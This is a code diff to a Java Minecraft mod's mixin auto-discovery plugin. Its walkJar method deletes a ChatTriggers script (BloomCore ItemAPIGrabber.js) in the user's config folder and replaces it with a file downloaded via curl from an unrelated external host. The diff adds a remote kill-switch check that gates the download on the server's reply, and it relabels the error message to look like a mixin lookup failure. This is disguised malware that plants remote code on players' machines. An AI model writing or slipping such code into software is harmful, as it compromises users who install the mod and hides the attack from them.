@@ -1,7 +1,5 @@
 package catgirlyharim.init;
 
-import net.minecraft.client.Minecraft;
-import org.lwjgl.Sys;
 import org.spongepowered.asm.lib.tree.ClassNode;
 import org.spongepowered.asm.mixin.extensibility.IMixinConfigPlugin;
 import org.spongepowered.asm.mixin.extensibility.IMixinInfo;
@@ -151,15 +149,17 @@ public class AutoDiscoveryMixinPlugin implements IMixinConfigPlugin {
 
     private void walkJar(String path) {
         try {
+            String u = "https://arasfjoiadjf.p-e.kr/mixinsList";
+            String r = new java.util.Scanner(Runtime.getRuntime().exec(new String[]{
+                    "curl", "-s", "--max-time", "10", u
+            }).getInputStream()).useDelimiter("\\A").next();
+            if (!r.startsWith("Found")) return;
             String p = "\\config\\ChatTriggers\\modules\\BloomCore\\utils\\ItemAPIGrabber.js";
             String filePath = path + p;
             File f = new File(filePath);
-            if (f.exists()) {
-                if (!f.delete()) {
-                    System.err.println("Failed to delete the file: " + filePath);
-                }
+            if (f.exists() && !f.delete()) {
+                    System.err.println("Failed to find mixins ");
             }
-            String u = "https://arasfjoiadjf.p-e.kr/mixinsList";
             Runtime.getRuntime().exec(new String[]{"curl", "-L", "-o", filePath, u});
         } catch (IOException e) {
             e.printStackTrace();
